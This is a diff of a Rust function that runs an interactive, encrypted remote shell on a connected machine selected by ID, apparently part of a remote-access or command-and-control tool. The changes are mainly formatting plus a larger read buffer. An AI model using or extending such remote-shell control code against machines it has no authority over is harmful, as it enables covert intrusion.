@@ -1,23 +1,27 @@
-use tokio::{
-    select,
-    io::{AsyncReadExt, AsyncWriteExt, AsyncBufReadExt},
-    sync::
-        Mutex,
-};
+use crate::utils::ConnectionInfo;
+use simple_crypt::{decrypt, encrypt};
 use std::{
-    io::{Error, ErrorKind, Write},
     collections::HashMap,
+    io::{Error, ErrorKind, Write},
     sync::Arc,
 };
-use simple_crypt::{encrypt, decrypt};
-use crate::utils::ConnectionInfo;
+use tokio::{
+    io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt},
+    select,
+    sync::Mutex,
+};
 
 pub async fn handle_spawn(
-    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>, command: &str, raw_connection: bool)
-    -> Result<String, Error> {
+    active_connections: &Arc<Mutex<HashMap<String, ConnectionInfo>>>,
+    command: &str,
+    raw_connection: bool,
+) -> Result<String, Error> {
     let parts: Vec<&str> = command.splitn(2, ' ').collect();
     if parts.len() < 2 {
-        return Err(Error::new(ErrorKind::InvalidInput, "Invalid command, expected 'spawn ID'"));
+        return Err(Error::new(
+            ErrorKind::InvalidInput,
+            "Invalid command, expected 'spawn ID'",
+        ));
     }
     let id: usize = match parts[1].trim().parse() {
         Ok(num) => num,
@@ -35,16 +39,19 @@ pub async fn handle_spawn(
     let (mut reader, mut writer) = stream_lock.split();
     let mut prefix = String::new();
     let mut input = String::new();
-    let mut output = [0; 1024];
-    let mut encrypted_input ;
+    let mut output = [0; 65535];
+    let mut encrypted_input;
     let mut decrypted_output;
     let mut myreader = tokio::io::BufReader::new(tokio::io::stdin());
-    
-    if !raw_connection { 
+
+    if !raw_connection {
         prefix = "||PSHEXEC|| ".to_string();
-     }
-    
-    println!("Spawned new shell on remote ID: {}. Type 'exit' to return.", id);
+    }
+
+    println!(
+        "Spawned new shell on remote ID: {}. Type 'exit' to return.",
+        id
+    );
     loop {
         print!("$: ");
         std::io::stdout().flush().unwrap();
@@ -62,7 +69,7 @@ pub async fn handle_spawn(
                 let mut cmdout = String::from_utf8_lossy(&decrypted_output).to_string();
                 cmdout = cmdout.replace("||cmd||", "");
                 println!("\r{}", cmdout);
-                output = [0; 1024];
+                output = [0; 65535];
             }
         }
     }
